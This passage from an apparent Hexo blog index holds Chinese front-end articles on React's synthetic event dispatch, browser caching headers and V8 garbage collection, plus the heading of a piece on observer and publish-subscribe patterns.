title="事件执行"></a>事件执行</h4><p>在trapBubbledEvent中，我们看到listen最后执行的回调函数是dispatchEvent，这个方法就是React执行事件分发的入口。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// topLevelType：带top的事件名，如topClick。不用纠结为什么带一个top字段，知道它是事件名就OK了</span><br><span class="line">// nativeEvent: 用户触发click等事件时，浏览器传递的原生事件</span><br><span class="line">dispatchEvent: function (topLevelType, nativeEvent) &#123;</span><br><span class="line">    // disable了则直接不回调相关方法</span><br><span class="line">    if (!ReactEventListener._enabled) &#123;</span><br><span class="line">      return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    var bookKeeping = TopLevelCallbackBookKeeping.getPooled(topLevelType, nativeEvent);</span><br><span class="line">    try &#123;</span><br><span class="line">      // 放入批处理队列中,React事件流也是一个消息队列的方式</span><br><span class="line">      ReactUpdates.batchedUpdates(handleTopLevelImpl, bookKeeping);</span><br><span class="line">    &#125; finally &#123;</span><br><span class="line">      TopLevelCallbackBookKeeping.release(bookKeeping);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可见我们仍然使用批处理的方式进行事件分发，handleTopLevelImpl才是事件分发的真正执行者，它是事件分发的核心，体现了React事件分发的特点。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// document进行事件分发,这样具体的React组件才能得到响应。因为DOM事件是绑定到document上的</span><br><span class="line">function handleTopLevelImpl(bookKeeping) &#123;</span><br><span class="line">  // 找到事件触发的DOM和React Component</span><br><span class="line">  var nativeEventTarget = getEventTarget(bookKeeping.nativeEvent);</span><br><span class="line">  var targetInst = ReactDOMComponentTree.getClosestInstanceFromNode(nativeEventTarget);</span><br><span class="line"></span><br><span class="line">  // 执行事件回调前,先由当前组件向上遍历它的所有父组件。得到ancestors这个数组。</span><br><span class="line">  // 因为事件回调中可能会改变Virtual DOM结构,所以要先遍历好组件层级</span><br><span class="line">  var ancestor = targetInst;</span><br><span class="line">  do &#123;</span><br><span class="line">    bookKeeping.ancestors.push(ancestor);</span><br><span class="line">    ancestor = ancestor &amp;&amp; findParent(ancestor);</span><br><span class="line">  &#125; while (ancestor);</span><br><span class="line"></span><br><span class="line">  // 从当前组件向父组件遍历,依次执行注册的回调方法. 我们遍历构造ancestors数组时,是从当前组件向父组件回溯的,故此处事件回调也是这个顺序</span><br><span class="line">  // 这个顺序就是冒泡的顺序,并且我们发现不能通过stopPropagation来阻止&apos;冒泡&apos;。</span><br><span class="line">  for (var i = 0; i &lt; bookKeeping.ancestors.length; i++) &#123;</span><br><span class="line">    targetInst = bookKeeping.ancestors[i];</span><br><span class="line">    ReactEventListener._handleTopLevel(bookKeeping.topLevelType, targetInst, bookKeeping.nativeEvent, getEventTarget(bookKeeping.nativeEvent));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>事件处理由_handleTopLevel完成。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// React事件调用的入口。DOM事件绑定在了document原生对象上,每次事件触发,都会调用到handleTopLevel</span><br><span class="line">handleTopLevel: function (topLevelType, targetInst, nativeEvent, nativeEventTarget) &#123;</span><br><span class="line">  // 采用对象池的方式构造出合成事件。不同的eventType的合成事件可能不同</span><br><span class="line">  var events = EventPluginHub.extractEvents(topLevelType, targetInst, nativeEvent, nativeEventTarget);</span><br><span class="line">  // 批处理队列中的events</span><br><span class="line">  runEventQueueInBatch(events);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>React的合成事件机制还是比较复杂的，这里只是部分，但是也可是大致感受到它从自动委托到分发执行的过程，希望对大家理解有所帮助。</p><blockquote><p>参考链接：<a href="https://blog.csdn.net/u013510838/article/details/612247609" target="_blank" rel="noopener">React源码分析7 — React合成事件系统</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> JS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浏览器缓存策略</title>
      <link href="/%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BC%93%E5%AD%98%E7%AD%96%E7%95%A5.html"/>
      <url>/%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BC%93%E5%AD%98%E7%AD%96%E7%95%A5.html</url>
      
        <content type="html"><![CDATA[<p>开发的时候，我们常常会遇到因为缓存而导致页面修改没有及时展示的情况，这个时候我们不禁就会思考，为什么有时候页面缓存了，有时候页面没有缓存，究竟如何正确使用缓存，如何快速定位问题是否由缓存导致，本文我们就来深入理解下浏览器的缓存机制。</p><a id="more"></a><h2 id="缓存简介"><a href="#缓存简介" class="headerlink" title="缓存简介"></a>缓存简介</h2><p>所谓缓存，就是浏览器将一些资源存放在用户磁盘或内存中的行为。根据缓存存放的位置不同，可以将缓存分为 <code>内存缓存</code> 和 <code>硬盘缓存</code>, 根据缓存的策略不同，可以分为 <code>强制缓存</code> 和 <code>协商缓存</code>。</p><p>浏览器与服务器通信的方式为应答模式，即是：浏览器发起HTTP请求 – 服务器响应该请求。那么浏览器第一次向服务器发起该请求后拿到请求结果，会根据响应报文中HTTP头的缓存标识，决定是否缓存结果，是则将请求结果和缓存标识存入浏览器缓存中，简单的过程如下图<br><img src="../assets/20191120/1.jpg" alt="Alt text"></p><ul><li>浏览器发起请求，检查缓存中是否含有所需资源和缓存标识</li><li>当没有需要的缓存资源，则向服务器发起请求</li><li>服务器返回资源</li><li>浏览器根据缓存标识决定是否需要将资源保存在缓存中</li></ul><p>下面我们先来看看 <code>内存缓存</code> 和 <code>硬盘缓存</code>。</p><h2 id="内存缓存-硬盘缓存"><a href="#内存缓存-硬盘缓存" class="headerlink" title="内存缓存/硬盘缓存"></a>内存缓存/硬盘缓存</h2><h3 id="内存缓存-from-memory-cache"><a href="#内存缓存-from-memory-cache" class="headerlink" title="内存缓存(from memory cache)"></a>内存缓存(from memory cache)</h3><p>内存缓存具有两个特点，分别是快速读取和时效性：</p><ul><li>快速读取：内存缓存会将编译解析后的文件，直接存入该进程的内存中，占据该进程一定的内存资源，以方便下次运行使用时的快速读取。</li><li>时效性：一旦该进程关闭，则该进程的内存则会清空。</li></ul><h3 id="硬盘缓存-from-disk-cache"><a href="#硬盘缓存-from-disk-cache" class="headerlink" title="硬盘缓存(from disk cache)"></a>硬盘缓存(from disk cache)</h3><p>硬盘缓存则是直接将缓存写入硬盘文件中，读取缓存需要对该缓存存放的硬盘文件进行I/O操作，然后重新解析该缓存内容，读取复杂，速度比内存缓存慢。</p><h3 id="两者比较"><a href="#两者比较" class="headerlink" title="两者比较"></a>两者比较</h3><p><img src="../assets/20191120/2.jpg" alt="Alt text"></p><p>浏览器读取命中强缓存资源的顺序为memory –&gt; disk：</p><ul><li>先去内存看，如果有，直接加载；</li><li>如果内存没有，则取硬盘获取，如果有直接加载；</li><li>如果硬盘也没有，那么就进行网络请求；</li><li>加载到的资源缓存到硬盘和内存。</li></ul><table><thead><tr><th style="text-align:center">类型</th><th style="text-align:center">时效性</th><th style="text-align:center">容量</th><th style="text-align:left">存放内容</th></tr></thead><tbody><tr><td style="text-align:center">内存缓存</td><td style="text-align:center">进程关闭，内存清空</td><td style="text-align:center">小</td><td style="text-align:left">脚本、字体、图片等</td></tr><tr><td style="text-align:center">硬盘缓存</td><td style="text-align:center">时效长</td><td style="text-align:center">大</td><td style="text-align:left">CSS等</td></tr></tbody></table><p>由上可以看出内存缓存中大多存放JS、图片等资源，而硬盘缓存中大多存放CSS资源以及容量较大的资源，这是因为：</p><ul><li>CSS样式加载一次即可渲染出网页。</li><li>脚本可能随时会执行，如果脚本在磁盘当中，在执行该脚本需要从磁盘中取到内存当中来。这样的IO开销是比较大的，有可能会导致浏览器失去响应。</li></ul><h2 id="强制缓存"><a href="#强制缓存" class="headerlink" title="强制缓存"></a>强制缓存</h2><p>强制缓存就是向浏览器缓存查找该请求结果，并根据该结果的缓存规则来决定是否使用该缓存结果的过程。</p><h3 id="三种情况"><a href="#三种情况" class="headerlink" title="三种情况"></a>三种情况</h3><ul><li>不存在该缓存结果和缓存标识，强制缓存失效，则直接向服务器发起请求（跟第一次发起请求一致），如下图</li></ul><p><img src="../assets/20191120/3.jpg" alt="Alt text"></p><ul><li>存在该缓存结果和缓存标识，但该结果已失效，强制缓存失效，则使用协商缓存(暂不分析)，如下图</li></ul><p><img src="../assets/20191120/4.jpg" alt="Alt text"></p><ul><li>存在该缓存结果和缓存标识，且该结果尚未失效，强制缓存生效，直接返回该结果，如下图</li></ul><p><img src="../assets/20191120/5.jpg" alt="Alt text"></p><h3 id="Expires"><a href="#Expires" class="headerlink" title="Expires"></a>Expires</h3><p>Expires是HTTP/1.0控制网页缓存的字段，其值为服务器返回该请求结果缓存的到期时间，即再次发起该请求时，如果客户端的时间小于Expires的值时，直接使用缓存结果。<br>到了HTTP/1.1，Expire已经被Cache-Control替代，原因在于Expires控制缓存的原理是使用客户端的时间与服务端返回的时间做对比，那么如果客户端与服务端的时间因为某些原因（例如时区不同；客户端和服务端有一方的时间不准确）发生误差，那么强制缓存则会直接失效，这样的话强制缓存的存在则毫无意义。</p><h3 id="Cache-Control"><a href="#Cache-Control" class="headerlink" title="Cache-Control"></a>Cache-Control</h3><p>在HTTP/1.1中，Cache-Control是最重要的规则，主要用于控制网页缓存，主要取值为：</p><ul><li>public：所有内容都将被缓存（客户端和代理服务器都可缓存）</li><li>private：所有内容只有客户端可以缓存，Cache-Control的默认取值</li><li>no-cache：客户端缓存内容，但是是否使用缓存则需要经过协商缓存来验证决定</li><li>no-store：所有内容都不会被缓存，即不使用强制缓存，也不使用协商缓存</li><li>max-age=xxx (xxx is numeric)：缓存内容将在xxx秒后失效</li></ul><p><img src="../assets/20191120/6.jpg" alt="Alt text"></p><p>Cache-Control的优先级高于Expires，Cache-Control的是相对值，而Expires是绝对值，在不确客户端和服务端时间是否一致的情况下，推荐优先使用Cache-Control。</p><h2 id="协商缓存"><a href="#协商缓存" class="headerlink" title="协商缓存"></a>协商缓存</h2><p>协商缓存就是强制缓存失效后，浏览器携带缓存标识向服务器发起请求，由服务器根据缓存标识决定是否使用缓存的过程。</p><h3 id="两种情况"><a href="#两种情况" class="headerlink" title="两种情况"></a>两种情况</h3><ul><li>协商缓存生效，返回304，如下</li></ul><p><img src="../assets/20191120/7.jpg" alt="Alt text"></p><ul><li>协商缓存失效，返回200和请求结果结果，如下</li></ul><p><img src="../assets/20191120/8.jpg" alt="Alt text"></p><h3 id="Last-Modified-If-Modified-Since"><a href="#Last-Modified-If-Modified-Since" class="headerlink" title="Last-Modified / If-Modified-Since"></a>Last-Modified / If-Modified-Since</h3><ul><li>Last-Modified：是服务器响应请求时，返回该资源文件在服务器最后被修改的时间</li><li>If-Modified-Since：则是客户端再次发起该请求时，携带上次请求返回的Last-Modified值，通过此字段值告诉服务器该资源上次请求返回的最后被修改时间。服务器收到该请求，发现请求头含有If-Modified-Since字段，则会根据If-Modified-Since的字段值与该资源在服务器的最后被修改时间做对比，若服务器的资源最后被修改时间大于If-Modified-Since的字段值，则重新返回资源，状态码为200；否则则返回304，代表资源无更新，可继续使用缓存文件</li></ul><h3 id="Etag-If-None-Match"><a href="#Etag-If-None-Match" class="headerlink" title="Etag / If-None-Match"></a>Etag / If-None-Match</h3><ul><li>Etag：是服务器响应请求时，返回当前资源文件的一个唯一标识(由服务器生成)</li><li>If-None-Match：是客户端再次发起该请求时，携带上次请求返回的唯一标识Etag值，通过此字段值告诉服务器该资源上次请求返回的唯一标识值。服务器收到该请求后，发现该请求头中含有If-None-Match，则会根据If-None-Match的字段值与该资源在服务器的Etag值做对比，一致则返回304，代表资源无更新，继续使用缓存文件；不一致则重新返回资源文件，状态码为200</li></ul><p>Etag / If-None-Match优先级高于Last-Modified / If-Modified-Since，同时存在则只有Etag / If-None-Match生效。</p><h2 id="完整缓存流程"><a href="#完整缓存流程" class="headerlink" title="完整缓存流程"></a>完整缓存流程</h2><p><img src="../assets/20191120/9.jpg" alt="Alt text"></p><ul><li>请求访问缓存</li><li>若存在Expires和Cache-Control，则进行强制缓存</li><li>若存在Etag / If-None-Match，则进行协商缓存</li><li>若存在Last-Modified / If-Modified-Since，则进行协商缓存</li><li>若不存在缓存标识，则向服务器请求资源，并将返回资源及缓存标志放入缓存中</li></ul><h2 id="实际应用"><a href="#实际应用" class="headerlink" title="实际应用"></a>实际应用</h2><p>了解了缓存机制，我们就来看看缓存能用来做什么。<br>在我们网页开发过程中，为了实现各种交互功能和页面的美化，我们会引入不少资源，但是在反复加载的过程中，如果我们不断向服务器去请求这些资源，会降低网站的性能，尤其当这些资源的容量较大时，这一性能缺陷就会更为明显，所以我们可以利用设置缓存标志，将那些不常更新，容量较大的资源保存在缓存里，加快网站的再次渲染。</p><ul><li>在服务器设置Etag / If-None-Match或Last-Modified / If-Modified-Since，采用协商缓存，可以减少从服务器返回资源的次数，但还是需要多次请求访问服务端</li><li>在服务器设置Expires或Cache-Control，直接从缓存中获取资源，更大提升了性能</li></ul><p>以上就是有关缓存机制的全部内容，有理解不到位的地方，欢迎各位大佬指正。</p><blockquote><p>参考链接：<br><a href="https://heyingye.github.io/2018/04/16/%E5%BD%BB%E5%BA%95%E7%90%86%E8%A7%A3%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6/" target="_blank" rel="noopener">彻底理解浏览器的缓存机制</a><br><a href="https://www.jianshu.com/p/f331d5f0b979" target="_blank" rel="noopener">前端性能优化-HTTP添加Expires头</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>V8垃圾回收机制</title>
      <link href="/V8%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6.html"/>
      <url>/V8%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在类似C/C++等语言的开发中，程序员不可避免需要跟踪内存的使用情况以此来降低内存占用，提高程序的性能，而对于JavaScript，JavaScript具有自动垃圾收集机制，这就意味着程序员不用关心内存使用问题，垃圾收集器会按照固定的时间间隔，找出不再继续使用的内存，自动将其释放。<br>本文就一同来探索垃圾回收的原理。</p><a id="more"></a><h2 id="垃圾收集两种策略"><a href="#垃圾收集两种策略" class="headerlink" title="垃圾收集两种策略"></a>垃圾收集两种策略</h2><h3 id="标记清除"><a href="#标记清除" class="headerlink" title="标记清除"></a>标记清除</h3><p>当变量进入环境（例如，在函数中声明一个变量）时，就将这个变量标记为“进入环境”。从逻辑上讲，永远不能释放进入环境的变量所占用的内存，因为只要执行流进入相应的环境，就可能会用到它们。而当变量离开环境时，则将其标记为“离开环境”。<br>可以使用任何方式来标记变量。比如，可以通过翻转某个特殊的位来记录一个变量何时进入环境，或者使用一个“进入环境的”变量列表及一个“离开环境的”变量列表来跟踪哪个变量发生了变化。如何标记变量并不重要，关键在于采取什么策略。</p><p>运行机制：</p><ul><li>垃圾收集器在运行时给存储在内存中的所有变量都加上标记。</li><li>去掉环境中的变量以及被环境中的变量引用的变量的标记。</li><li>被加上标记的变量被视为准备删除的变量。</li><li>垃圾收集器完成内存清楚，销毁带标记的值并回收所占用的内存空间。</li></ul><p>目前，IE、Firefox、Opera、Chrome和Safari的JavaScript实现使用的都是标记清除式的垃圾回收策略（或类似的策略），只不过垃圾收集的时间间隔互有不同。</p><h3 id="引用计数"><a href="#引用计数" class="headerlink" title="引用计数"></a>引用计数</h3><p>引用计数含义是跟踪记录每个值被引用的次数。当声明了一个变量并将一个引用类型值赋给该变量时，则这个值的引用次数就是1。如果同一个值又被赋给另一个变量，则该值的引用次数加1。相反，如果包含对这个值引用的变量改变了引用对象，则该值引用次数减1。当这个值的引用次数变成0时，则说明没有办法再访问这个值了，因而就可以将其占用的内存空间回收回来。这样，当垃圾收集器下次再运行时，它就会释放那些引用次数为0的值所占用的内存。</p><p>运行机制：</p><ul><li>将引用类型复制给变量，引用次数+1。</li><li>包含该引用的变量获取了其他值，引用次数-1。</li><li>引用次数为0的变量为需要回收的值。</li><li>垃圾收集器释放引用次数为0的值所占用内存。</li></ul><h4 id="循环引用"><a href="#循环引用" class="headerlink" title="循环引用"></a>循环引用</h4><p>引用计数遇到的最大问题，就是循环引用。<code>循环引用</code>指的是对象A中包含一个指向对象B的指针，而对象B中也包含一个指向对象A的引用。这个现象在使用BOM和DOM对象时尤其明显。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var element = document.getElementById(&quot;some_element&quot;);</span><br><span class="line">element.onlick = function(e)&#123;</span><br><span class="line">    console.log(e.target);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>在element对象的onclick属性上指向了一个函数，而在函数传入的变量对象上，可以访问到element的信息，这里就产生了循环引用，element将永远不会被收回。如想要使其被回收则需要作如下操作。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">element.onclick = null;</span><br></pre></td></tr></table></figure></p><h4 id="弱引用"><a href="#弱引用" class="headerlink" title="弱引用"></a>弱引用</h4><p>在上个小节里，我们提到了BOM和DOM对象大多存在循环引用的问题，这里就顺便补充下关于ES6的知识。<br>我们知道在ES6里新提出了两种数据集合类型： <code>Set</code> 和 <code>Map</code> 。他们类似于数组，但他们的成员的值一定是唯一的，没有重复值。而为了针对浏览器的垃圾回收机制，这两个数据结构引入了 <code>弱引用</code> 概念又扩展出了 <code>WeakSet</code> 和 <code>WeakMap</code> 。</p><p>弱引用指的是垃圾回收机制不考虑WeakSet和WeakMap对该对象的引用，也就是说，如果其他对象都不再引用该对象，那么垃圾回收机制会自动回收该对象所占用的内存，不考虑该对象还存在于WeakSet或WeakMap之中。WeakSet和WeakMap里面的引用，都不计入垃圾回收机制。</p><ul><li><p>WeakSet不能遍历，是因为成员都是弱引用，随时可能消失，遍历机制无法保证成员的存在，很可能刚刚遍历结束，成员就取不到了。WeakSet的一个用处，是储存DOM节点，而不用担心这些节点从文档移除时，会引发内存泄漏。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">const foos = new WeakSet() </span><br><span class="line">class Foo &#123; </span><br><span class="line">  constructor() &#123; </span><br><span class="line">    foos.add(this) </span><br><span class="line">  &#125;</span><br><span class="line">  method () &#123; </span><br><span class="line">    if (!foos.has(this)) &#123; </span><br><span class="line">      throw new TypeError(&apos;Foo.prototype.method 只能在Foo的实例上调 用！&apos;); </span><br><span class="line">    &#125; </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line">//保证了Foo的实例方法，只能在Foo的实例上调用。</span><br></pre></td></tr></table></figure></li><li><p>在网页的DOM元素上添加数据，就可以使用WeakMap结构。当该DOM元素被清除，其所对应的WeakMap记录就会自动被移除。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">const e1 = document.getElementById(&apos;foo&apos;); </span><br><span class="line">const e2 = document.getElementById(&apos;bar&apos;); </span><br><span class="line">const arr = [ </span><br><span class="line">  [e1, &apos;foo 元素&apos;], </span><br><span class="line">  [e2, &apos;bar 元素&apos;], </span><br><span class="line">];</span><br></pre></td></tr></table></figure></li></ul><h2 id="V8垃圾回收策略"><a href="#V8垃圾回收策略" class="headerlink" title="V8垃圾回收策略"></a>V8垃圾回收策略</h2><p>V8采用了一种代回收的策略，将内存分为两个生代：<code>新生代（new generation）</code> 和 <code>老生代（old generation）</code>。<br>新生代中的对象为存活时间较短的对象，老生代中的对象为存活时间较长或常驻内存的对象，分别对新老生代采用不同的垃圾回收算法来提高效率，对象最开始都会先被分配到新生代（如果新生代内存空间不够，直接分配到老生代），新生代中的对象会在满足某些条件后，被移动到老生代，这个过程也叫晋升。</p><h3 id="分代内存"><a href="#分代内存" class="headerlink" title="分代内存"></a>分代内存</h3><p>默认情况下，32位系统新生代内存大小为16MB，老生代内存大小为700MB，64位系统下，新生代内存大小为32MB，老生代内存大小为1.4GB。</p><p>新生代平均分成两块相等的内存空间，叫做semispace，每块内存大小8MB（32位）或16MB（64位）。</p><h3 id="新生代"><a href="#新生代" class="headerlink" title="新生代"></a>新生代</h3><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>新生代存的都是生存周期短的对象，分配内存也很容易，只保存一个指向内存空间的指针，根据分配对象的大小递增指针就可以了，当存储空间快要满时，就进行一次垃圾回收。</p><h4 id="Scavenge算法"><a href="#Scavenge算法" class="headerlink" title="Scavenge算法"></a>Scavenge算法</h4><p>新生代采用Scavenge垃圾回收算法，在算法实现时主要采用Cheney算法。</p><p>Cheney算法将内存一分为二，叫做semispace，一块处于使用状态，一块处于闲置状态。<br>处于使用状态的semispace称为From空间，处于闲置状态的semispace称为To空间。</p><ul><li>在From空间中分配了3个对象A、B、C。<br><img src="../assets/20191112/1.jpg" alt="Alt text"></li></ul><ul><li>GC进来判断对象B没有其他引用，可以回收，对象A和C依然为活跃对象。<br><img src="../assets/20191112/2.jpg" alt="Alt text"></li></ul><ul><li>将活跃对象A、C从From空间复制到To空间。<br><img src="../assets/20191112/3.jpg" alt="Alt text"></li></ul><ul><li>清空From空间的全部内存。<br><img src="../assets/20191112/4.jpg" alt="Alt text"></li></ul><ul><li>交换From空间和To空间。<br><img src="../assets/20191112/5.jpg" alt="Alt text"></li></ul><ul><li>在From空间中又新增了2个对象D、E。<br><img src="../assets/20191112/6.jpg" alt="Alt text"></li></ul><ul><li>下一轮GC进来发现对象D没有引用了，做标记。<br><img src="../assets/20191112/7.jpg" alt="Alt text"></li></ul><ul><li>将活跃对象A、C、E从From空间复制到To空间。<br><img src="../assets/20191112/8.jpg" alt="Alt text"></li></ul><ul><li>清空From空间全部内存。<br><img src="../assets/20191112/9.jpg" alt="Alt text"></li></ul><ul><li>继续交换From空间和To空间，开始下一轮。<br><img src="../assets/20191112/10.jpg" alt="Alt text"></li></ul><p>通过上面的流程图，我们可以很清楚的看到，进行From和To交换，就是为了让活跃对象始终保持在一块semispace中，另一块semispace始终保持空闲的状态。<br>Scavenge由于只复制存活的对象，并且对于生命周期短的场景存活对象只占少部分，所以它在时间效率上有优异的体现。Scavenge的缺点是只能使用堆内存的一半，这是由划分空间和复制机制所决定的。<br>由于Scavenge是典型的牺牲空间换取时间的算法，所以无法大规模的应用到所有的垃圾回收中。但我们可以看到，Scavenge非常适合应用在新生代中，因为新生代中对象的生命周期较短，恰恰适合这个算法。</p><h4 id="晋升"><a href="#晋升" class="headerlink" title="晋升"></a>晋升</h4><p>当一个对象经过多次复制仍然存活时，它就会被认为是生命周期较长的对象。这种较长生命周期的对象随后会被移动到老生代中，采用新的算法进行管理。<br>对象从新生代移动到老生代的过程叫作晋升。</p><p>对象晋升的条件主要有两个：</p><ul><li>对象从From空间复制到To空间时，会检查它的内存地址来判断这个对象是否已经经历过一次Scavenge回收。如果已经经历过了，会将该对象从From空间移动到老生代空间中，如果没有，则复制到To空间。总结来说，如果一个对象是第二次经历从From空间复制到To空间，那么这个对象会被移动到老生代中。</li><li>当要从From空间复制一个对象到To空间时，如果To空间已经使用了超过25%，则这个对象直接晋升到老生代中。设置25%这个阈值的原因是当这次Scavenge回收完成后，这个To空间会变为From空间，接下来的内存分配将在这个空间中进行。如果占比过高，会影响后续的内存分配。</li></ul><h3 id="老生代"><a href="#老生代" class="headerlink" title="老生代"></a>老生代</h3><h4 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h4><p>在老生代中，存活对象占较大比重，如果继续采用Scavenge算法进行管理，就会存在两个问题：</p><ul><li>由于存活对象较多，复制存活对象的效率会很低。</li><li>采用Scavenge算法会浪费一半内存，由于老生代所占堆内存远大于新生代，所以浪费会很严重。</li></ul><p>所以，V8在老生代中主要采用了Mark-Sweep和Mark-Compact相结合的方式进行垃圾回收。</p><h4 id="Mark-Sweep"><a href="#Mark-Sweep" class="headerlink" title="Mark-Sweep"></a>Mark-Sweep</h4><p>Mark-Sweep是标记清除的意思，它分为标记和清除两个阶段。<br>与Scavenge不同，Mark-Sweep并不会将内存分为两份，所以不存在浪费一半空间的行为。Mark-Sweep在标记阶段遍历堆内存中的所有对象，并标记活着的对象，在随后的清除阶段，只清除没有被标记的对象。<br>也就是说，Scavenge只复制活着的对象，而Mark-Sweep只清除死了的对象。活对象在新生代中只占较少部分，死对象在老生代中只占较少部分，这就是两种回收方式都能高效处理的原因。</p><ul><li>老生代中有对象A、B、C、D、E、F<br><img src="../assets/20191112/11.jpg" alt="Alt text"></li></ul><ul><li>GC进入标记阶段，将A、C、E标记为存活对象<br><img src="../assets/20191112/12.jpg" alt="Alt text"></li></ul><ul><li>GC进入清除阶段，回收掉死亡的B、D、F对象所占用的内存空间<br><img src="../assets/20191112/13.jpg" alt="Alt text"></li></ul><p>可以看到，Mark-Sweep最大的问题就是，在进行一次清除回收以后，内存空间会出现不连续的状态。这种内存碎片会对后续的内存分配造成问题。<br>如果出现需要分配一个大内存的情况，由于剩余的碎片空间不足以完成此次分配，就会提前触发垃圾回收，而这次回收是不必要的。</p><h4 id="Mark-Compact"><a href="#Mark-Compact" class="headerlink" title="Mark-Compact"></a>Mark-Compact</h4><p>为了解决Mark-Sweep的内存碎片问题，Mark-Compact就被提出来了。<br>Mark-Compact是标记整理的意思，是在Mark-Sweep的基础上演变而来的。Mark-Compact在标记完存活对象以后，会将活着的对象向内存空间的一端移动，移动完成后，直接清理掉边界外的所有内存。</p><ul><li>老生代中有对象A、B、C、D、E、F（和Mark—Sweep一样）<br><img src="../assets/20191112/14.jpg" alt="Alt text"></li></ul><ul><li>GC进入标记阶段，将A、C、E标记为存活对象（和Mark—Sweep一样）<br><img src="../assets/20191112/15.jpg" alt="Alt text"></li></ul><ul><li>GC进入整理阶段，将所有存活对象向内存空间的一侧移动，灰色部分为移动后空出来的空间<br><img src="../assets/20191112/16.jpg" alt="Alt text"></li></ul><ul><li>GC进入清除阶段，将边界另一侧的内存一次性全部回收<br><img src="../assets/20191112/17.jpg" alt="Alt text"></li></ul><h4 id="两者结合"><a href="#两者结合" class="headerlink" title="两者结合"></a>两者结合</h4><p>在V8的回收策略中，Mark-Sweep和Mark-Conpact两者是结合使用的。<br>由于Mark-Conpact需要移动对象，所以它的执行速度不可能很快，在取舍上，V8主要使用Mark-Sweep，在空间不足以对从新生代中晋升过来的对象进行分配时，才使用Mark-Compact。</p><blockquote><p>参考链接：<a href="https://juejin.im/post/5ad3f1156fb9a028b86e78be" target="_blank" rel="noopener">聊聊V8引擎的垃圾回收（leocoder）</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>观察者模式与发布订阅模式</title>
      <link href="/%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F%E4%B8%8E%E5%8F%91%E5%B8%83%E8%AE%A2%E9%98%85%E6%A8%A1%E5%BC%8F.html"/>
      <url>/%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F%E4%B8%8E%E5%8F%91%E5%B8%83%E8%AE%A2%E9%98%85%E6%A8%A1%E5%BC%8F.html</url>
      
